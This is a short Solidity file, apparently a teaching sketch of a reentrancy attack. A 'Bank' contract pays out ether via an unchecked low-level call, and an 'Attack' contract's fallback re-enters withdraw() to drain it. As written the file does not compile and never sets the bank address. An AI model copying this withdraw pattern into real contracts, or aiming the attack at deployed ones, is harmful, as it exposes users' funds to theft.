pragma solidity ^0.5.0;

contract Bank{
  
  function deposit(){}

  function withdraw() public {
    msg.sender.call.value(10 ether)("");
  }
}

contract Attack{
  
  Bank public bank;

  function () external payable {
    attack();
  }

  function attack() public {
    bank.withdraw();
  }
}
